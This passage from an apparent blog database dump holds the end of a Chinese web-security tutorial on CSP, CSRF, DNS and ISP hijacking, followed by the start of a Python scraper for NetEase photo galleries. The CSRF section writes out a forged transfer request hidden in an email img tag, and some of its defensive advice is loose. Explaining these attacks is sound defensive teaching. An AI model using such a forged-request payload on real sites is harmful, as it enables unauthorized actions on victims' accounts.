module</a>进行转化。</p><h3>CSP之终极防护</h3><p>就算一个小小的lapse也会给hacker可乘之机。所以，在进行XSS防护时，难免会有些遗漏，CSP应该算是在hacker找到漏洞后的一道有力的防线。CSP的设计目的就是为了增强网页的安全性，解放程序员和hacker的死磕。而且，对于XSS的防护有这天然的优势。因为XSS，主要就是插入内嵌或者跨域的script执行。<br/></p><p>而CSP可以做到的就有:</p><ul class=\" list-paddingleft-2\"><li><p>不加载不安全脚本</p></li><li><p>不执行内联脚本</p></li><li><p>不执行eval函数</p></li></ul><p>那应该如何使用呢？CSP主要和响应头--Content‑Security‑Policy相关。<br/></p><p>通过server-side返回Content‑Security‑Policy头，来启用不同程度的防护措施。这里我们只介绍于XSS相关的。通常我们可以在CSP头里设置一些相关directive，比如:</p><ul class=\" list-paddingleft-2\"><li><p>default-src: 默认资源设置, 比如js,css,img,fonts,xhr等</p></li><li><p>script-src: 设置js脚本的相关方法</p></li><li><p>style-src: 设置css脚本的相关方法</p></li><li><p>img-src: 设置图片的相关方法</p></li><li><p>child-src: 设置iframe的相关sandbox</p></li></ul><p>不过我们一般只需要了解前4个即可。每个值可以取相关的属性。比如:<code>default-src self</code>表示默认页面的资源只能加载同域的内容。我们来着重看一下<code>default-src</code>可以设置的内容。</p><table width=\"825\"><thead><tr class=\"firstRow\"><th>property</th><th>effect</th></tr></thead><tbody><tr><td>none</td><td>不允许从任何地方加载资源(估计用不上)</td></tr><tr><td>self</td><td>运行从同域的server下载资源</td></tr><tr><td>unsafe-inline</td><td>允许运行内联脚本</td></tr><tr><td>unsafe-eval</td><td>允许运行eval方法</td></tr></tbody></table><p>比如: 我们可以设置<code>script-src&#39;self&#39;</code>此时只允许同域资源，并且不会执行内联脚本和eval函数。如果解除两者的限制，可以添加上<code>script-src &#39;self&#39; &#39;unsafe-inline&#39;</code>另外我们还可以设置跨域脚本的执行<code>script-src &#39;self&#39; http://example.com</code>这样资源不仅仅可以从同源server-side下载，还可以从example.com下载。</p><p>推荐一个比较好的CSP头的设置内容:</p><pre><code class=\"language-css\">script‑src&nbsp;&#39;self&#39;&nbsp;scripts.example.com;\r\nimg‑src&nbsp;*;\r\ndefault‑src&nbsp;&#39;self&#39;&nbsp;http://*.example.com</code></pre><p>那如何启用CSP呢?在nginx下，给conf配置文件加上如下的内容：<code>add_header Content-Security-Policy &quot;default-src &#39;self&#39;;&quot;;</code></p><p>CSP参考文献:<a href=\"http://content-security-policy.com/\" target=\"_blank\">CSP.com</a></p><p>XSS参考文献:<a href=\"https://www.google.com/about/appsecurity/learning/xss/\" target=\"_blank\">google出品</a>&nbsp;&nbsp;<a href=\"https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.234_-_CSS_Escape_And_Strictly_Validate_Before_Inserting_Untrusted_Data_into_HTML_Style_Property_Values\" target=\"_blank\">OWASP防护</a></p><h2>CSRF攻击</h2><p>CSRF or cross-site request forgery跨域假冒请求。他的工作原理是通过GET或者POST发送相应的信息给一个信息网站, 比如银行网、信贷网、百合网等。在发送过程中, 实际上该次请求会带上你的原本的IP address和cookie info.<br/>假设网站www.example.com没有进行CORS(跨域请求设置)，同意任意域名的访问:<code>Access-Control-Allow-Origin: &#39;*&#39;</code>那么如果该网站的某个路由设置不当，就有可能发生CSRF。现在hacker给victim发送一封e-HTML邮件。邮件里面有这样一段内容:<code>&lt;img src=&quot;<a href=\"https://www.example.com/transfer?amount=1000&destination=jimmy&quot;>\" _src=\"https://www.example.com/transfer?amount=1000&destination=jimmy&quot;>\">https://www.example.com/transfer?amount=1000&amp;amp;destination=jimmy&quot;&gt;</a>&nbsp;</code></p><p>翻译一下就是给jimmy账户转过去100￥。当然前提是，该接口满足该方式的访问。当用户打开该email时，img会立即发送一个请求。 假设你的登录状态(session cookie)还未过期，在该请求中会一并带上在https://www.example.com/transfer下存储的cookie。相当于获得了你已经登录的权限，假冒你进行相关的操作。但是referer里的内容是不会被改变的，即如果你是从www.malicious.com发的请求，那么referer还是www.malicious.com(提示：跨域)。</p><p>不过目前来说没有哪位童鞋会通过最让hacker喜欢的get方式，去传输如此重要的信息。而且在get传输的时候，有心的dev也会做相关的混淆。那CSRF就没有办法了么? NO!没了get我还有POST.不过我们这里并不是讨论ajax的跨域post。因为ajax的post请求，只会发送当前页的cookie，而不会在浏览器中搜索目标页的cookie。而且CSRF的工作环境是user PC。而Form表单发送就是CSRF最好的post发送方式，即可以带上cookie，又可以避免浏览器的跨域干涉。下列是CSRF常用的几种方式：</p><p><img src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459926025924325.png\" title=\"1459926025924325.png\" alt=\"5.png\"/></p><h3>如何防范？</h3><p>(1) 设置secert Token</p><p>这个就很好理解了，即前端和后台双方协定一个token内容，或者直接由back-end生成random token。然后在有请求到来时server-side进行Token验证：</p><pre><code class=\"language-css\">&lt;form&nbsp;action=&quot;https://example.com/tweet&quot;&nbsp;method=&quot;POST&quot;&gt;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&lt;input&nbsp;type=&quot;hidden&quot;&nbsp;name=&quot;csrf-token&quot;&nbsp;value=&quot;nc98P987bcpncYhoadjoiydc9ajDlcn&quot;&nbsp;/&gt;\r\n&lt;/form&gt;</code></pre><p>这里的value就可以用来作为request有效性的说明。通常设置的token也是有讲究的, 比如可以使用指定字符+time来生成，指定字符+salt生成。这些Token验证方式，我们都可以自己下去琢磨的。所以, 就算hacker生成了form表单, 但是他的验证内容可能已经过期(无效Token)。同样, 我们还可以在cookie中设置验证Token。原理我就不过多介绍了，cookie中设置的内容和上文在form中设置的其实差不多。另外还需要注意的是，针对重要cookie需要设置httpOnly的选项，防止用户脚本获取cookie内容。</p><p>(2) 尽量使用JSON类型传输</p><p>因为form传输的格式为:<code>Content-Type:application/x-www-form-urlencoded</code></p><p>而JSON的传输类型为:<code>Content-Type: application/json</code></p><p>form没有办法去模仿JSON类型进行传输，所以这也是一个很好的办法。另外如果不得不使用form表单方式提交，还有另外一种方式，我们可以通过request Header中的referrer属性，来获得发送脚本的地址。通过whitelist来允许指定域的请求访问。</p><h2>DNS劫持</h2><p>关于DNS劫持, 事实上更偏向于User，因为实际上我们对这个无能为力。我们来简述一下DNS劫持的过程。</p><p><br/></p><p><img src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459926045287448.jpg\" title=\"1459926045287448.jpg\" alt=\"6.jpg\"/></p><p>如果清楚DNS的解析过程话，上图的逻辑就很清楚了。用户输入一个真域名向fake DNS Server发起UDP请求，然后DNS返回一个malicious的IP地址, 结果用户打开的是一个全屏广告。<br/></p><p>上图还忽略了一个很重要的步骤，那就是用户如何会向fake DNS Server发请求的呢？实际上这个锅需要用户背。以前trojan horse(木马病毒)盛行的时候，OS的安全性真的有点可怜。当用户下载来源不明的video,image,software...很可能会附带上蜜汁病毒，然后病毒会修改你的ISP服务配置，就是你的DNS提供商的IP地址。然后hacker会将他control的DNS Server填加进去。那我们怎样才能知道自己被hack了呢？很简单google呗。对于MAC用户，只要找到你的DNS列表，然后对应FBI或者国家安全网提供的DNSchanger IP对照一下，如果有就cleanup一下。</p><h2>HTTP(ISP)劫持</h2><p>可能我们印象深刻的就是网页上的弹窗广告了，那个就是ISP劫持。我们来看一下ISP如何劫持的HTTP流量的:</p><p>当C-&gt;S 发送一个网页请求，ISP获得之后, 给他自己的缓存服务器，如果命中缓存, 则返回已经修改过后的页面信息(满屏操广告)。如果没有，要么是你的网页浏览量不够，要么是别人已经存满了，你的网页侥幸的没有被插菊花。命中后，缓存服务器伪装为S，给C发送一个302(临时移动，告诉你应该从另外一个地方去取资源)。由于这是个重定向，所以传输速度就不用说了，C就只能乖乖的去缓存服务器那取资源。而忽略正确的Server返回的数据。之后的事，就是你看到的网页了。那我们有没有什么防护措施呢?</p><h3>普通用户的防范</h3><ol class=\" list-paddingleft-2\"><li><p>直接和你家网络提供商打电话，让他取消广告推送</p></li><li><p>该方法需要对技术有点了解特别是对网络结构模块有了解--网关、代理、隧道、ip等。参考:<a href=\"https://github.com/lehui99/ahjs5s\" target=\"_blank\">HTTP 防劫持</a></p></li></ol><h3>开发者的防范</h3><ol class=\" list-paddingleft-2\"><li><p>简单有效的方式是，使用HTTPS加密方式传输。因为ISP就是通过抓你的HTTP包，然后分析里面的内容，最终得到结果。而使用HTTPS方式即使ISP得到你的HTTPS包，由于有SSL的加密他也不能获得你的包内容。</p></li><li><p>替换你的js的提供商，使用HTTPS路径进行加载。比如使用<a href=\"https://support.qiniu.com/hc/kb/article/148868/\" target=\"_blank\">七牛的HTTPS提供的脚本服务</a>。因为ISP不经可以结果你的HTML，也可以结果你网页中所有的HTTP请求，而js又是最重要的内容，所以把这个控制到了那么你网页可以抵挡差不多80%的HTTP劫持。</p></li></ol><h2>总结图谱</h2><p><img src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459926075312395.png\" title=\"1459926075312395.png\" alt=\"7.png\"/></p><p>原文链接：<a href=\"https://segmentfault.com/a/1190000004850199\" target=\"_blank\" title=\"确保你网页的安全—— jimmy_thr\" textvalue=\"确保你网页的安全— jimmy_thr\">确保你网页的安全— jimmy_thr</a><br/></p>',1459915102,'2016-10-14 08:46:02','0000-00-00 00:00:00',1,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459915039846369.jpg?imageView2/1/w/210/h/140'),(118,0,'python','一只特立独行的猪2号','Python爬虫日记之爬取网易摄影图库照片','用大名鼎鼎的python爬虫爬取网易摄影图库的图片，支持两种页面链接的爬取，然后，，，当然是把美图保存到本地啦。方便走起！','python爬取网易摄影图库照片','利用python爬取网易摄影里面的图片，可以爬取某个摄影师的所有图片，或者某个图集的所有图片','爬虫，网易摄影','爬虫日记',267,'<p><img style=\"border-radius:4px\" src=\"http://lzxya.kssws.ks-cdn.com/image_1456455874557643.jpg@base@tag=imgScale&q=100&w=690\" title=\"1456455874557643.jpg\" alt=\"9.jpg\"/></p><p>以前找文章配图的时候偶然发现了这个网站，图片相当不错的说，于是乎...上爬虫！</p><p>为什么不用php爬呢，大概我觉得用python爬比php方便吧...</p><p>上代码前首先知道网站的两种链接：</p><p>1.这种是图集展示页面的链接</p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456454713920916.png@base@tag=imgScale&q=100&w=690\" title=\"1456454713920916.png\" alt=\"4111.png\"/></p><p>2.这种是摄影师的展示页面</p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456455168951753.png@base@tag=imgScale&q=100&w=690\" title=\"1456455168951753.png\" alt=\"5238.png\"/></p><h2>好了，上代码！</h2><pre><code class=\"language-css\">#&nbsp;-*-&nbsp;coding:utf-8&nbsp;-*-\r\nfrom&nbsp;urllib&nbsp;import&nbsp;request,&nbsp;parse\r\nimport&nbsp;re\r\nimport&nbsp;os\r\n\r\nclass&nbsp;pawanyitu:\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这是要放图片的文件夹\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.PathImg&nbsp;=&nbsp;&quot;F:\\py\\msoul\\\\&quot;\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPage(self,urlF):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;str(urlF)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requesturl&nbsp;=&nbsp;request.Request(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;request.urlopen(requesturl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;response.read().decode(&#39;gbk&#39;,&#39;ignore&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;request.URLError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(e,&#39;reason&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&quot;连接网易摄影页面失败，错误原因：&quot;,e.reason)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getContents(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageImg&nbsp;=&nbsp;self.getImglist(page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;pictureId:.*?url:&#39;(.*?)&#39;,tinyUrl&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;re.findall(pattern,pageImg)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;items\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getImglist(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;window.pic960List&nbsp;=&nbsp;{(.*?)};&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result.group(1).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getTupTitle(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;window.PS&nbsp;=&nbsp;{id.*?name:&nbsp;&#39;(.*?)&#39;,&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result.group(1).strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;mkdirImg(self,path):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pathName&nbsp;=&nbsp;path.strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;self.PathImg&nbsp;+&nbsp;pathName\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isExists&nbsp;=&nbsp;os.path.exists(path)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;isExists:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在创建名为&quot;,pathName,u&quot;的图集文件夹&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.makedirs(path)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;名为&quot;,pathName,u&quot;的文件夹已经存在了！&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;saveImgs(self,images,name):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;发现&quot;,name,u&quot;共有&quot;,len(images),u&quot;张照片&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,imageUrl&nbsp;in&nbsp;enumerate(images):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;splitPath&nbsp;=&nbsp;imageUrl.split(&#39;.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fTail&nbsp;=&nbsp;splitPath.pop()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(fTail)&nbsp;&gt;&nbsp;3:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fTail&nbsp;=&nbsp;&quot;jpg&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fileName&nbsp;=&nbsp;name&nbsp;+&nbsp;&quot;/&quot;&nbsp;+&nbsp;str(k+1)&nbsp;+&nbsp;&quot;.&quot;&nbsp;+&nbsp;fTail\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.saveImg(imageUrl,fileName)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;saveImg(self,imgUrl,fileName):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePath&nbsp;=&nbsp;self.PathImg&nbsp;+&nbsp;fileName\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u&nbsp;=&nbsp;request.urlopen(imgUrl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;u.read()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;open(filePath,&#39;wb&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(data)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在保存一张图片&quot;,fileName)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这种是爬第一种链接的方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;savPageImg(self,urlFs):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;isinstance(urlFs,list):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;urlF&nbsp;in&nbsp;urlFs:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPage(urlF)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Images&nbsp;=&nbsp;self.getContents(page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Title&nbsp;=&nbsp;self.getTupTitle(page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.mkdirImg(Title)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.saveImgs(Images,Title)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;输入格式错误&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getUserImgurl(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&lt;li&nbsp;class=&quot;w-cover&quot;.*?&lt;a.*?&lt;a&nbsp;href=&quot;(.*?)&quot;&nbsp;title&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;re.findall(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;items\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这种是爬第二种链接的方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;savUserPageImg(self,urlU):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPage(urlU)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;imagesUrl&nbsp;=&nbsp;self.getUserImgurl(page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.savPageImg(imagesUrl)\r\n\r\npa&nbsp;=&nbsp;pawanyitu()\r\n#如果使用第一种链接，则将要爬的图集链接放到下面这个list里面\r\nimgs&nbsp;=&nbsp;[\r\n&#39;http://pp.163.com/gyln/pp/16678037.ht